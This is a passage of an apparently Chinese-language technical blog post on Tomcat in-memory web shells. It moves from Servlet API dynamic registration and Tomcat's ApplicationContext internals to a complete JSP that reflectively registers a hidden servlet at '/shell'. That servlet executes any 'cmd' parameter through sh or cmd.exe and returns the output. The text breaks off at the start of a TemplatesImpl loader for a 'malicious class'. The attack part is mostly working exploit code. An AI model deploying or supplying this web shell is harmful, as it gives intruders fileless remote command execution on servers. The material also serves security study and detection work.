class="line"></span><br><span class="line">    <span class="comment">// ===== Filter =====</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 容器实例化一个 Filter（仅创建，不注册）。 */</span></span><br><span class="line">    &lt;T <span class="keyword">extends</span> <span class="title class_">Filter</span>&gt; T <span class="title function_">createFilter</span><span class="params">(Class&lt;T&gt; c)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 注册 Filter（类名）。 */</span></span><br><span class="line">    FilterRegistration.Dynamic <span class="title function_">addFilter</span><span class="params">(String filterName, String className)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 注册 Filter（实例）。 */</span></span><br><span class="line">    FilterRegistration.Dynamic <span class="title function_">addFilter</span><span class="params">(String filterName, Filter filter)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 注册 Filter（Class，由容器创建实例）。 */</span></span><br><span class="line">    FilterRegistration.Dynamic <span class="title function_">addFilter</span><span class="params">(String filterName, Class&lt;? extends Filter&gt; filterClass)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>上面这些 <code>add*</code> 方法<strong>只能在应用启动期调用</strong>；否则容器应抛 <code>IllegalStateException</code>。在业务应用中常常在 <code>ServletContextListener#contextInitialized</code> 里注册 Servlet、Listener、Filter 组件。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> java.util.EnumSet;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppInitializer</span> <span class="keyword">implements</span> <span class="title class_">ServletContextListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent sce)</span> &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">ctx</span> <span class="operator">=</span> sce.getServletContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1) 注册 Servlet（用类让容器来创建实例，也可传实例）</span></span><br><span class="line">        ServletRegistration.<span class="type">Dynamic</span> <span class="variable">s</span> <span class="operator">=</span> ctx.addServlet(<span class="string">&quot;hello&quot;</span>, HelloServlet.class);</span><br><span class="line">        <span class="keyword">if</span> (s != <span class="literal">null</span>) &#123;                            <span class="comment">// null 说明同名已存在</span></span><br><span class="line">            s.addMapping(<span class="string">&quot;/hello/*&quot;</span>);                 <span class="comment">// 返回冲突的 pattern 集合，空=成功</span></span><br><span class="line">            s.setLoadOnStartup(<span class="number">1</span>);                    <span class="comment">// 启动期预初始化（非懒加载）</span></span><br><span class="line">            s.setAsyncSupported(<span class="literal">true</span>);                <span class="comment">// 需要异步时打开</span></span><br><span class="line">            s.setInitParameter(<span class="string">&quot;k&quot;</span>, <span class="string">&quot;v&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) （可选）注册 Filter</span></span><br><span class="line">        FilterRegistration.<span class="type">Dynamic</span> <span class="variable">f</span> <span class="operator">=</span> ctx.addFilter(<span class="string">&quot;log&quot;</span>, <span class="keyword">new</span> <span class="title class_">LogFilter</span>());</span><br><span class="line">        <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">            f.addMappingForUrlPatterns(</span><br><span class="line">                    EnumSet.of(DispatcherType.REQUEST), <span class="literal">true</span>, <span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) （可选）注册 Listener</span></span><br><span class="line">        ctx.addListener(<span class="keyword">new</span> <span class="title class_">MySessionListener</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextDestroyed</span><span class="params">(ServletContextEvent sce)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="Servlet-型内存马"><a href="#Servlet-型内存马" class="headerlink" title="Servlet 型内存马"></a>Servlet 型内存马</h4><p>前面注册注册组件使用的 <code>javax.servlet.ServletContext</code> 只是接口。通过调试 <code>addServlet</code> 函数调用发现是 <code>org.apache.catalina.core.ApplicationContext#addServlet</code> 完成实际的添加操作。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.catalina.core.ApplicationContext.addServlet(ApplicationContext.java:886)</span><br><span class="line">at org.apache.catalina.core.ApplicationContext.addServlet(ApplicationContext.java:839)</span><br><span class="line">at org.apache.catalina.core.ApplicationContextFacade.addServlet(ApplicationContextFacade.java:494)</span><br><span class="line">at AppInitializer.contextInitialized(AppInitializer.java:16)</span><br></pre></td></tr></table></figure></div>

<p>直接 <code>ApplicationContext#addServlet</code> 会有一些注册状态的检查，但是分析 <code>ApplicationContext#addServlet</code> 的实现可知，该函数实际是通过调用它的 <code>context</code> 成员完成注册的，因此我们可以仿照 <code>ApplicationContext#addServlet</code> 的过程直接调用 <code>context</code> 的相关方法完成注册。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 说明：这是 ApplicationContext 里的私有实现，用于承接所有 addServlet(...) 重载。</span></span><br><span class="line"><span class="comment">// 语义：根据传入的 servletName / servletClass / servlet 实例 与 initParams，</span></span><br><span class="line"><span class="comment">//      在当前 Web 应用（StandardContext）下创建/取得对应的 Wrapper（Servlet 节点），</span></span><br><span class="line"><span class="comment">//      完成必要的初始化，返回一个可继续配置映射/参数的 Registration 句柄。</span></span><br><span class="line"><span class="comment">// 约束：只能在“应用启动期”调用（context 尚未完全初始化）；否则将抛 IllegalStateException。</span></span><br><span class="line"><span class="keyword">private</span> ServletRegistration.Dynamic <span class="title function_">addServlet</span><span class="params">(String servletName,</span></span><br><span class="line"><span class="params">        String servletClass, Servlet servlet, Map&lt;String,String&gt; initParams)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalStateException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 校验名称：Servlet 名称不能为空</span></span><br><span class="line">    <span class="keyword">if</span> (servletName == <span class="literal">null</span> || servletName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// sm 是 StringManager，做国际化消息拼装；抛出非法参数异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">            sm.getString(<span class="string">&quot;applicationContext.invalidServletName&quot;</span>, servletName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 状态检查：规范要求编程式注册只能发生在应用启动期；</span></span><br><span class="line">    <span class="comment">//    一旦上下文已初始化完成，调用应抛 IllegalStateException。</span></span><br><span class="line">    <span class="comment">//    这里的 checkState(key) 会在“已初始化”时抛 ISE，key 用于定位错误消息。</span></span><br><span class="line">    <span class="comment">//    注释里的 TODO 表示：未来可能考虑（不符合规范地）放宽这个限制。</span></span><br><span class="line">    checkState(<span class="string">&quot;applicationContext.addServlet.ise&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 查找是否已存在同名的 Wrapper（每个 Servlet 对应一个 Wrapper 节点）</span></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) context.findChild(servletName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// “完整的” ServletRegistration 指的是同时具备 name 与 class 的定义</span></span><br><span class="line">    <span class="keyword">if</span> (wrapper == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 4) 如果没有同名 Wrapper：创建一个新 Wrapper，设置名称，并挂到 Context 之下</span></span><br><span class="line">        wrapper = context.createWrapper();</span><br><span class="line">        wrapper.setName(servletName);</span><br><span class="line">        context.addChild(wrapper);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 5) 若已有同名 Wrapper 且“已完整定义”（既有 name 又有 servletClass）</span></span><br><span class="line">        <span class="keyword">if</span> (wrapper.getName() != <span class="literal">null</span> &amp;&amp; wrapper.getServletClass() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 这是 Tomcat 的可覆盖（overridable）扩展：</span></span><br><span class="line">            <span class="comment">// - 某些来源（如片段/占位定义）可能被标为可覆盖；</span></span><br><span class="line">            <span class="comment">// - 如果可覆盖，则本次注册把它“占用”并关闭再次覆盖的可能；</span></span><br><span class="line">            <span class="comment">// - 如果不可覆盖，则返回 null，表示注册失败（与 API 文档一致）。</span></span><br><span class="line">            <span class="keyword">if</span> (wrapper.isOverridable()) &#123;</span><br><span class="line">                wrapper.setOverridable(<span class="literal">false</span>);  <span class="comment">// 覆盖一次后就不可再覆盖</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 名称冲突且不可覆盖 ⇒ 注册失败（调用方应据此判断）</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 处理 @ServletSecurity 注解（若存在）</span></span><br><span class="line">    <span class="type">ServletSecurity</span> <span class="variable">annotation</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (servlet == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 6.a 以“类名”方式注册：仅记录类名，实例由容器稍后创建</span></span><br><span class="line">        wrapper.setServletClass(servletClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过内省尝试加载类，以便检查是否带有 @ServletSecurity 注解</span></span><br><span class="line">        Class&lt;?&gt; clazz = Introspection.loadClass(context, servletClass);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            annotation = clazz.getAnnotation(ServletSecurity.class);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 6.b 以“现成实例”方式注册：记录类名并直接绑定实例</span></span><br><span class="line">        wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">        wrapper.setServlet(servlet);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 仅当该实例被容器视为“动态创建的 servlet 实例”（通常由 createServlet(...) 得到）</span></span><br><span class="line">        <span class="comment">// 才读取其上的注解。这样可避免对任意外部自建实例做不期望的注解处理。</span></span><br><span class="line">        <span class="keyword">if</span> (context.wasCreatedDynamicServlet(servlet)) &#123;</span><br><span class="line">            annotation = servlet.getClass().getAnnotation(ServletSecurity.class);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7) 注入 init-params（初始化参数）到 Wrapper（等价于 web.xml 的 &lt;init-param&gt;）</span></span><br><span class="line">    <span class="keyword">if</span> (initParams != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String,String&gt; initParam : initParams.entrySet()) &#123;</span><br><span class="line">            wrapper.addInitParameter(initParam.getKey(), initParam.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8) 构造并返回一个“可继续配置”的注册句柄：</span></span><br><span class="line">    <span class="comment">//    - ApplicationServletRegistration 持有 wrapper 与 context 的引用，</span></span><br><span class="line">    <span class="comment">//      允许后续调用 setLoadOnStartup / setAsyncSupported / addMapping 等。</span></span><br><span class="line">    ServletRegistration.<span class="type">Dynamic</span> <span class="variable">registration</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ApplicationServletRegistration</span>(wrapper, context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9) 如果找到了 @ServletSecurity 注解，则将其封装为 ServletSecurityElement 并应用：</span></span><br><span class="line">    <span class="comment">//    这会把安全约束（如 HTTP 方法约束、角色约束、传输保障）合并到应用的安全配置里。</span></span><br><span class="line">    <span class="keyword">if</span> (annotation != <span class="literal">null</span>) &#123;</span><br><span class="line">        registration.setServletSecurity(<span class="keyword">new</span> <span class="title class_">ServletSecurityElement</span>(annotation));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 10) 返回 Registration 句柄，调用方通常还会继续：</span></span><br><span class="line">    <span class="comment">//     - registration.addMapping(&quot;/foo&quot;, &quot;/bar/*&quot;)</span></span><br><span class="line">    <span class="comment">//     - registration.setLoadOnStartup(1)</span></span><br><span class="line">    <span class="comment">//     - registration.setAsyncSupported(true)</span></span><br><span class="line">    <span class="keyword">return</span> registration;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里 <code>context</code> 是 <code>org.apache.catalina.core.StandardContext</code> 类型。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 与本对象关联的 Context 实例。</span></span><br><span class="line"><span class="comment"> * 具体为 Tomcat 的 StandardContext（Catalina 容器中当前 Web 应用的节点），</span></span><br><span class="line"><span class="comment"> * 用于在容器层面执行实际的注册、映射等内部操作。</span></span><br><span class="line"><span class="comment"> * 注意：它不同于 Servlet API 的 ServletContext（对应用可见的门面对象）。</span></span><br><span class="line"><span class="comment"> * 由于被声明为 final，引用在构造时确定，生命周期与所属 Web 应用一致。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> StandardContext context;</span><br></pre></td></tr></table></figure></div>

<p>根据对 <code>ApplicationContext#addServlet</code> 函数的分析，我们等价实现如下过程：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">stdcontext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">newWrapper</span> <span class="operator">=</span> stdcontext.createWrapper();</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> servlet.getClass().getSimpleName();</span><br><span class="line">newWrapper.setName(name);</span><br><span class="line">newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">newWrapper.setServlet(servlet);</span><br><span class="line">newWrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line"></span><br><span class="line">stdcontext.addChild(newWrapper);</span><br></pre></td></tr></table></figure></div>

<p>之后需要调用 <code>StandardContext#addServletMappingDecoded</code> 添加路径映射：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stdcontext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>, name);</span><br></pre></td></tr></table></figure></div>

<p>JSP 代码如下：</p>
<div class="code-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">            out.println(output);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">            servletRequest.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>); <span class="comment">// POST 参数防乱码（GET 需配 connector URIEncoding）</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">stdcontext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">newWrapper</span> <span class="operator">=</span> stdcontext.createWrapper();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> servlet.getClass().getSimpleName();</span><br><span class="line">    newWrapper.setName(name);</span><br><span class="line">    newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    newWrapper.setServlet(servlet);</span><br><span class="line">    newWrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    stdcontext.addChild(newWrapper);</span><br><span class="line">    stdcontext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>, name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>TemplatesImpl</code> 字节码加载恶意类实现如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span 